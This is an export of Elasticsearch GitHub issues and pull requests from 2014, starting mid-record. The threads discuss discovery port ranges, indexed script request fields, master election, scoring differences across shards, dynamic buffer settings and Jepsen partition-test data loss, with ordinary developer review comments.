</description><key id="41815601">7562</key><summary>Transport: Deprecate parsing of port ranges</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>:Network</label></labels><created>2014-09-03T13:25:30Z</created><updated>2015-03-19T10:19:04Z</updated><resolved>2014-12-11T10:52:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-11-11T20:05:24Z" id="62611978">@spinscale and this one
</comment><comment author="spinscale" created="2014-12-11T10:52:53Z" id="66602553">closing this for now, not an issue anymore in tests and does not seem to be a problem for anyone else.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Transport: Remove parsing of port ranges</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7561</link><project id="" key="" /><description>UnicastZenDiscovery allowed you to specify port ranges for hosts to connect to.
However only the first port was used at all, when specifying something like
`host[9300-9400]`. This commit only accepts `host:port` pairs and thus makes
the configuration reflect the execution as even in the old setup only a single
host:port pair was pinged at all, as this was very expensive.

Note there is a coming PR for 1.x, which deprecates this setting and emits a warning instead of removing it.
</description><key id="41815516">7561</key><summary>Transport: Remove parsing of port ranges</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/spinscale/following{/other_user}', u'events_url': u'https://api.github.com/users/spinscale/events{/privacy}', u'organizations_url': u'https://api.github.com/users/spinscale/orgs', u'url': u'https://api.github.com/users/spinscale', u'gists_url': u'https://api.github.com/users/spinscale/gists{/gist_id}', u'html_url': u'https://github.com/spinscale', u'subscriptions_url': u'https://api.github.com/users/spinscale/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/667544?v=4', u'repos_url': u'https://api.github.com/users/spinscale/repos', u'received_events_url': u'https://api.github.com/users/spinscale/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/spinscale/starred{/owner}{/repo}', u'site_admin': False, u'login': u'spinscale', u'type': u'User', u'id': 667544, u'followers_url': u'https://api.github.com/users/spinscale/followers'}</assignee><reporter username="">spinscale</reporter><labels><label>:Network</label></labels><created>2014-09-03T13:24:36Z</created><updated>2015-03-19T10:19:04Z</updated><resolved>2014-12-11T10:52:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-03T14:04:34Z" id="54301825">I'm -1 for this change because of the following:
- https://github.com/elasticsearch/elasticsearch-cloud-aws/issues/99#issuecomment-47430809 
- https://github.com/elasticsearch/elasticsearch/issues/7090 here.

Or it means that discovery plugins need to add more than one node in the unicast list of nodes.

WDYT?
</comment><comment author="spinscale" created="2014-09-03T14:14:11Z" id="54303190">it does not matter, if the max setting is `1` or `2`. If you allow the user to set an arbitrary port range (i.e. 100 ports) and then try two ports instead one, you can also make him set `host:1` and `host:2` - which at least has the advantage, that the user knows what happens and does not start to wonder, why the there is no connection initiated, if the node is running on `host:3` - the current situation is just confusing from a configuration and usability point of view
</comment><comment author="dadoonet" created="2014-09-03T14:17:57Z" id="54303748">@spinscale That's indeed what I suggested here: https://github.com/elasticsearch/elasticsearch-cloud-aws/issues/99#issuecomment-47422422

&gt; So we could think of changing the code to something like:
&gt; 
&gt; ``` java
&gt; TransportAddress[] addresses = transportService.addressesFromString(address);
&gt; // we only limit to 3 addresses, makes no sense to ping 100 ports
&gt; for (int i = 0; (i &lt; addresses.length &amp;&amp; i &lt; 3); i++) {
&gt;        logger.trace("adding {}, address {}, transport_address {}", instance.getInstanceId(), address, addresses[i]);
&gt;        discoNodes.add(new DiscoveryNode("#cloud-" + instance.getInstanceId() + "-" + i, addresses[i], Version.CURRENT));
&gt; }
&gt; ```

But @kimchy preferred to manage that in elasticsearch core code not in plugins if I understood correctly.
</comment><comment author="clintongormley" created="2014-11-11T20:03:08Z" id="62611478">@spinscale what's happening with this one?
</comment><comment author="spinscale" created="2014-11-11T21:18:13Z" id="62622248">@clintongormley waiting for feedback here on my comments, cc @kimchy 
</comment><comment author="spinscale" created="2014-12-11T10:52:51Z" id="66602544">closing this for now, not an issue anymore in tests and does not seem to be a problem for anyone else.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: get indexed script holds an always null fetch source context</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7560</link><project id="" key="" /><description>`GetIndexedScriptRequest` holds a fetch source context and supports serializing it over the transport, although the field has no setter nor getter.

Question is: do we want to remove it or does it make sense to properly support fetch source context?
</description><key id="41813913">7560</key><summary>Internal: get indexed script holds an always null fetch source context</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/GaelTadh/following{/other_user}', u'events_url': u'https://api.github.com/users/GaelTadh/events{/privacy}', u'organizations_url': u'https://api.github.com/users/GaelTadh/orgs', u'url': u'https://api.github.com/users/GaelTadh', u'gists_url': u'https://api.github.com/users/GaelTadh/gists{/gist_id}', u'html_url': u'https://github.com/GaelTadh', u'subscriptions_url': u'https://api.github.com/users/GaelTadh/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/5190064?v=4', u'repos_url': u'https://api.github.com/users/GaelTadh/repos', u'received_events_url': u'https://api.github.com/users/GaelTadh/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/GaelTadh/starred{/owner}{/repo}', u'site_admin': False, u'login': u'GaelTadh', u'type': u'User', u'id': 5190064, u'followers_url': u'https://api.github.com/users/GaelTadh/followers'}</assignee><reporter username="">javanna</reporter><labels><label>bug</label><label>discuss</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T13:06:26Z</created><updated>2014-09-24T09:27:30Z</updated><resolved>2014-09-24T09:27:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-10T07:52:27Z" id="55082208">moving out to 1.5
</comment><comment author="GaelTadh" created="2014-09-24T09:27:30Z" id="56645700">Fixed by 8e742c2096dad1e87e88719902b961e2b7100fa6
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Java api: get indexed script support for routing is incomplete</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7559</link><project id="" key="" /><description>`GetIndexedScriptRequest` supports setting a routing value, which never gets serialized over the transport though nor read when converting the request to the internal get one, also the correspoinding write operations `PutIndexedScriptRequest` and `DeleteIndexedScriptRequest` don't support it, thus it makes no sense to support it when reading.

Question is: does it make sense to support routing here or shall we remove the support for it as it never worked?
</description><key id="41813574">7559</key><summary>Java api: get indexed script support for routing is incomplete</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/GaelTadh/following{/other_user}', u'events_url': u'https://api.github.com/users/GaelTadh/events{/privacy}', u'organizations_url': u'https://api.github.com/users/GaelTadh/orgs', u'url': u'https://api.github.com/users/GaelTadh', u'gists_url': u'https://api.github.com/users/GaelTadh/gists{/gist_id}', u'html_url': u'https://github.com/GaelTadh', u'subscriptions_url': u'https://api.github.com/users/GaelTadh/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/5190064?v=4', u'repos_url': u'https://api.github.com/users/GaelTadh/repos', u'received_events_url': u'https://api.github.com/users/GaelTadh/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/GaelTadh/starred{/owner}{/repo}', u'site_admin': False, u'login': u'GaelTadh', u'type': u'User', u'id': 5190064, u'followers_url': u'https://api.github.com/users/GaelTadh/followers'}</assignee><reporter username="">javanna</reporter><labels><label>bug</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T13:02:26Z</created><updated>2014-09-19T11:15:43Z</updated><resolved>2014-09-19T11:15:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T16:07:11Z" id="54716575">Given that the index is a single shard as of #7500, it seems that routing isn't required.  (Unless users can change these settings?)
</comment><comment author="javanna" created="2014-09-09T12:15:43Z" id="54960196">Right I would just remove any mention of routing around get indexed script api then.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Master election should demotes nodes which try to join the cluster for the first time</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7558</link><project id="" key="" /><description>With the change in #7493 ,  we introduced a pinging round when a master nodes goes down. That pinging round helps validating the current state of the cluster and takes, by default, 3 seconds. It may be that during that window, a new node tries to join the cluster and starts pinging (this is typical when you quickly restart the current master).  If this node gets elected as the new master it will force recovery from the gateway (it has no in memory cluster state), which in turn will cause a full cluster shard synchronisation. While this is not a problem on it's own, it's a shame. This commit demotes "new" nodes during master election so the will only be elected if really needed.
</description><key id="41809882">7558</key><summary>Master election should demotes nodes which try to join the cluster for the first time</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Cluster</label><label>blocker</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T12:19:56Z</created><updated>2015-06-07T12:08:27Z</updated><resolved>2014-09-16T15:41:38Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-04T20:58:51Z" id="54544031">@kimchy I pushed another update based on our discussion. 
</comment><comment author="s1monw" created="2014-09-05T07:41:23Z" id="54594302">I left some comments @bleskes 
</comment><comment author="s1monw" created="2014-09-10T11:29:28Z" id="55102461">LGTM
</comment><comment author="bleskes" created="2014-09-11T09:20:17Z" id="55239803">Re-opening as there is some BWC work to be done for 1.4
</comment><comment author="bleskes" created="2014-09-16T15:41:38Z" id="55763073">this is now back ported to 1.x &amp; 1.4
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix `index` setting in `_boost` field</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7557</link><project id="" key="" /><description>Serialization if "index" setting for boost did not work since
the serialization was just true/false instead of valid options
"no"/"not_analyzed"/"analyzed".
</description><key id="41807754">7557</key><summary>Fix `index` setting in `_boost` field</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brwe</reporter><labels><label>:Mapping</label><label>bug</label><label>v1.2.5</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T11:51:21Z</created><updated>2015-06-07T18:50:17Z</updated><resolved>2014-09-03T12:34:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-03T11:53:27Z" id="54285423">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations: Geo bounds aggregation throwing ArrayIndexOutOfBoundsException on array resize</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7556</link><project id="" key="" /><description>There is a bug in the collect method of org.elasticsearch.search.aggregations.metrics.geobounds.GeoBoundsAggregator. When it resizes all the arrays at the top of the method it resizes posLefts twice instead of resizing posRights. This causes and ArrayIndexOutOfBoundsException.
</description><key id="41805451">7556</key><summary>Aggregations: Geo bounds aggregation throwing ArrayIndexOutOfBoundsException on array resize</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">owainb</reporter><labels><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T11:18:50Z</created><updated>2014-09-03T14:26:56Z</updated><resolved>2014-09-03T14:25:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="owainb" created="2014-09-03T11:21:59Z" id="54282669">Should have mentioned that this is discussed in https://groups.google.com/forum/#!topic/elasticsearch/iUMK5GJ3JsQ
</comment><comment author="colings86" created="2014-09-03T14:26:20Z" id="54304999">@owainb thanks for reporting the bug
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Netty Transport: Use ChannelFutureListener on shutdown</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7555</link><project id="" key="" /><description>Instead of waiting uninterruptable for each channel, one
can use a countdown latch instead and thus the channel is not
blocked.
</description><key id="41804863">7555</key><summary>Netty Transport: Use ChannelFutureListener on shutdown</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels /><created>2014-09-03T11:09:38Z</created><updated>2014-10-21T21:41:06Z</updated><resolved>2014-09-11T11:45:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-03T21:16:59Z" id="54368795">why do we have this change, to make sure we can interrupt while closing the thread? In that case, we can use `await` instead of `awaitUninterruptibly`?
</comment><comment author="spinscale" created="2014-09-04T08:39:25Z" id="54432342">@kimchy I agree, using `await()` is more concise and yields the same result instead of using a count down latch
</comment><comment author="spinscale" created="2014-09-11T11:45:00Z" id="55252561">superceded by #7688
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Different queryNorm parameters over several shards during one request</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7554</link><project id="" key="" /><description>Given: 5 shards, multi_match query with fuzziness set to `auto`.
Mapping has several names for each language(i.e. name_ru, name_en, name_fr etc).

```
query: { 
    multi_match: {
          fields: ["name_*"],
          query: "&#1052;&#1072;&#1088;&#1089;&#1077;&#1083;&#1100;",
          fuzziness: :auto,
          operator: :and,
          prefix_length: 3
    } 
}, 
sort: '_score', 
search_type: 'dfs_query_then_fetch'
```

Query returns several results. Expected that the document with field containing value `&#1052;&#1072;&#1088;&#1089;&#1077;&#1083;&#1100;` should get highest score. But highest score gets document with field containig value `&#1052;&#1072;&#1088;&#1089;&#1072;&#1083;&#1072;`.

Digging into explain result gives:
for `&#1052;&#1072;&#1088;&#1089;&#1077;&#1083;&#1100;`:

```
 "_shard" : 2,
....(omitted)
"details" : [ {
            "value" : 6.5739636,
            "description" : "weight(name_ru:&#1084;&#1072;&#1088;&#1089;&#1077;&#1083; in 3782) [PerFieldSimilarity], result of:",
            "details" : [ {
              "value" : 6.5739636,
              "description" : "score(doc=3782,freq=1.0 = termFreq=1.0\n), product of:",
              "details" : [ {
                "value" : 0.6098557,
                "description" : "queryWeight, product of:",
                "details" : [ {
                  "value" : 10.779539,
                  "description" : "idf(docFreq=1, maxDocs=35337)"
                }, {
                  "value" : 0.056575306,
                  "description" : "queryNorm"
                } ]
```

for `&#1052;&#1072;&#1088;&#1089;&#1072;&#1083;&#1072;`:

```
 "_shard" : 3,
....(omitted)
"details" : [ {
            "value" : 7.622285,
            "description" : "weight(name_ru:&#1084;&#1072;&#1088;&#1089;&#1072;^0.6 in 3827) [PerFieldSimilarity], result of:",
            "details" : [ {
              "value" : 7.622285,
              "description" : "score(doc=3827,freq=1.0 = termFreq=1.0\n), product of:",
              "details" : [ {
                "value" : 0.70710677,
                "description" : "queryWeight, product of:",
                "details" : [ {
                  "value" : 0.6,
                  "description" : "boost"
                }, {
                  "value" : 10.779539,
                  "description" : "idf(docFreq=1, maxDocs=35337)"
                }, {
                  "value" : 0.10932854,
                  "description" : "queryNorm"
                } ]
              }, 
```

All other significant values are almost the same, but the difference within.

I understand that every shard is an independent Lucene index, but is there any workaround to this issue except using single shard for that? 
</description><key id="41804155">7554</key><summary>Different queryNorm parameters over several shards during one request</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">sck-v</reporter><labels /><created>2014-09-03T10:59:37Z</created><updated>2014-09-06T18:47:15Z</updated><resolved>2014-09-06T18:47:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T16:04:53Z" id="54716506">@rmuir is this really a difference in queryNorm between shards, or does it reflect some other calculation which has been rolled into queryNorm?

@sck-v btw, relying on term frequencies for fuzzy matching doesn't work very well at all.  By default, the less frequent misspellings have a higher weight than the more frequent correct spellings.  Better to just use fuzzy as a constant_score.
</comment><comment author="rmuir" created="2014-09-06T16:09:58Z" id="54716672">Its some other calculation (queryNorm is based on that), specifically fuzzy boost value as you suspect.
</comment><comment author="sck-v" created="2014-09-06T17:04:04Z" id="54720710">I guess it's not ok that document with boost of 0.6 has higher score than document with no boosting :) 

This is what Lucene's docs say:
`This factor does not affect document ranking (since all ranked documents are multiplied by the same factor)`
</comment><comment author="rmuir" created="2014-09-06T17:11:45Z" id="54720977">And those documents are correct. querynorm is a symptom.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Get indexed script shouldn't allow to set the index</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7553</link><project id="" key="" /><description>`GetIndexedScriptRequest` currently allows to set the index to the request, although ignored. Also the index gets serialized over the transport although not needed.
</description><key id="41802324">7553</key><summary>Get indexed script shouldn't allow to set the index</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Java API</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T10:32:59Z</created><updated>2015-06-07T18:50:35Z</updated><resolved>2014-09-03T10:41:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Mark transport client as such when instantiating</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7552</link><project id="" key="" /><description>This allows plugins to load/inject specific classes, when the client started
is a transport client (compared to being a node client).
</description><key id="41802267">7552</key><summary>Mark transport client as such when instantiating</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>:Java API</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T10:32:09Z</created><updated>2015-06-07T12:08:50Z</updated><resolved>2014-09-05T13:18:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-03T10:51:31Z" id="54279982">Ha great! I think @bleskes will like it as well :)
</comment><comment author="spinscale" created="2014-09-03T12:06:42Z" id="54286610">@uboness @javanna added a `client.type` property, which is either `node` or `transport` and cant be changed
</comment><comment author="javanna" created="2014-09-03T12:13:18Z" id="54287179">nice @spinscale I like it!
</comment><comment author="dadoonet" created="2014-09-03T12:13:32Z" id="54287193">Could we add a static final String for "transport" and "node" values?
</comment><comment author="spinscale" created="2014-09-03T16:41:15Z" id="54326243">@uboness moved into the check into `InternalNode`
</comment><comment author="uboness" created="2014-09-05T10:39:10Z" id="54609634">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Simplify reading / writing from and to BlobContainer</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7551</link><project id="" key="" /><description>BlobContainer used to provide async APIs which are not used
internally. The implementation of these APIs are also not async
by nature and neither is any of the pluggable BlobContainers. This
commit simplifies the API to a simple input / output stream and
reduces the hierarchy of BlobContainer dramatically.
NOTE: This is a breaking change!
</description><key id="41800748">7551</key><summary>Simplify reading / writing from and to BlobContainer</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Internal</label><label>breaking</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T10:11:40Z</created><updated>2015-06-06T16:25:05Z</updated><resolved>2014-09-05T20:30:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-03T10:12:10Z" id="54276479">@imotov @kimchy would you mind taking a look at this
</comment><comment author="imotov" created="2014-09-03T22:53:07Z" id="54379755">Left a couple of comments. Everything else LGTM.
</comment><comment author="s1monw" created="2014-09-04T18:33:39Z" id="54523648">@imotov I pushed a new commit including some more removals can you check it out?
</comment><comment author="imotov" created="2014-09-05T19:39:24Z" id="54671575">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make `indices.memory.index_buffer_size` dynamically updatable</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7550</link><project id="" key="" /><description>This is PR for #7045 

It also makes related settings (min/max_index_buffer_size and min/max_shard_index_buffer_size dynamically updatable.

But I have some concerns I wasn't sure about.  First, whether the ShardsIndicesStatusChecker.run (the methods that "bubbles down" the allowed RAM to all active shards) is thread-safe or not since it can now be called from two threads at once.  Probably I will just put a lock around it to be safe ...

Second, I just added these to ClusterDynamicSettingsModule, yet I use NodeSettingsService.addListener to subscribe to changes; is this right?  Also, in the test, I'm using "persistent" cluster settings, but I'm not familiar with this (where do these changes persist?) and I couldn't figure out how to do a full restart and confirm the dynamic changes did in fact persist somewhere ... so I could use some pointers here :)
</description><key id="41800100">7550</key><summary>Make `indices.memory.index_buffer_size` dynamically updatable</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>:Settings</label><label>enhancement</label></labels><created>2014-09-03T10:03:05Z</created><updated>2015-08-11T13:28:00Z</updated><resolved>2015-08-10T22:15:25Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-03T21:02:46Z" id="54366731">I like the patch but the test is too complicated.... I left an example
</comment><comment author="mikemccand" created="2014-09-04T14:53:44Z" id="54488997">OK I simplified the test, added docs, added test cases to catch a bug in my last iteration that would lose previous settings (revert them to defaults) if you changed only one setting.

But the tests faile during cleanup because ElasticsearchSingleNodeTest is upset that I left persistent cluster settings behind ... how can I fix that?  (Is it bad to use persistent settings?)  I noticed ElasticsearchIntegrationTest has a ClusterScope annotation that lets you turn off this checking, but ESSingleNodeTest doesn't...
</comment><comment author="s1monw" created="2014-09-04T18:05:10Z" id="54519398">@mikemccand argh that is a node setting - I need to fix the single node test to allow that... stay tuned
</comment><comment author="s1monw" created="2014-09-05T19:38:00Z" id="54671389">left a small comment - other that that LGTM
</comment><comment author="mikemccand" created="2014-09-05T23:30:52Z" id="54693775">OK I folded in all feedback, but... the new test cases intermittently fail, because the settings have not actually changed after the request returns.

I suspect the change is actually asynchronous?  Like I must somehow wait for the cluster state to be updated / onRefreshSettings invoked, not just for the request to return (.get())?  Maybe this is what @kimchy was getting at with assertBusy... but then I tried using assertBusy as well, which tries for up to 10 seconds to get assertions passing, but it also fails ... now I'm confused :)  I'll keep digging...
</comment><comment author="mikemccand" created="2015-08-10T22:15:25Z" id="129631552">I could never get to the bottom of why the test would fail, but now I don't think we should make this setting dynamically updatable: this isn't a setting you should need to dynamically update, and I think it's risky to make it possible...
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Jepsen transient failures under network partition conditions</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7549</link><project id="" key="" /><description>Hi! Jepsen tests include five nemeses (test scenarios) that introduce different types of network partitions (see [here](http://aphyr.com/posts/317-call-me-maybe-elasticsearch)). The tests add documents to index before, during and after these partitions, and verify that the documents which were acknowledged during the partitions are retrievable afterwards. Sometimes the tests indicate that a number of documents were indexed, but are not retrievable---however, this does not happen on every run (of the same scenario). For example, in a run of 20 times each (against 598854dd72d7fb01a7e26a9dad065de3deaa5eb7), the following :lost-frac amounts were reported:

isolate-self-primaries-nemesis 244/361, 2/733, 1/607, 1/603, 1/213, 65/216 (and 14 times 0)
nemesis/partition-random-halves 1/355, 1/226, 4/733, 1/433 (and 16 times 0)
nemesis/partition-halves 1/65, 1/438, 4/715, 2/457, 6/731, 1/435, 9/433 (and 13 times 0)
nemesis/partitioner nemesis/bridge 2/415, 3/253, 2/383, 7/754, 1/786, 1/767 (and 14 times 0)
nemesis/partition-random-node does not report any lost documents.

In total, out of a 100 runs, 23 failed.
</description><key id="41791447">7549</key><summary>Jepsen transient failures under network partition conditions</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">pilvitaneli</reporter><labels><label>resiliency</label></labels><created>2014-09-03T08:11:56Z</created><updated>2016-09-27T13:00:36Z</updated><resolved>2016-09-27T13:00:36Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dakrone" created="2014-09-03T20:02:22Z" id="54356882">Hi @pilvitaneli, thanks for the testing results!

We're actively investigating Jepsen tests on top of our own tests, which resulted in #7572. The Jepsen tests helped verify that we fixed the split brain issue (it no longer happens). In all of our runs though, we couldn't simulate a result similar to your first run (the `isolate-self-primaries-nemesis` where you lost 244/361), still trying, but I might circle back with you to figure out how you ended up with those results. We do manage to simulate the smaller scale data loss that we believe relates to #7572, but this is also still under investigation.

I'll let you know how our continued testing with Jepsen goes, thanks again for your results!
</comment><comment author="pilvitaneli" created="2014-09-04T14:05:40Z" id="54481656">Running just isolate-self-primaries-nemesis 50 times in a succession results in 22 failures:
1/403
404/653
1/583
6/667
287/395
4/583
16/655
3/1037
8/807
1/565
1/555
5/638
1/626
3/784
3/653
2/621
3/632
1/254
1/610
3/307
11/668
1/446
</comment><comment author="dakrone" created="2014-10-21T14:17:47Z" id="59934221">@pilvitaneli circling back to this after a while, do you happen to have the commit sha of Jepsen that you are using for running your tests? I'd like to make sure we run the same tests.
</comment><comment author="pilvitaneli" created="2014-10-21T14:24:15Z" id="59935288">I haven't run in a while, but last was with https://github.com/aphyr/jepsen/commit/761693bd9b2a71528cb254e357ea1a6e8878129d . It does not appear as though there are considerable changes after that, but I could try to re-run with current master.
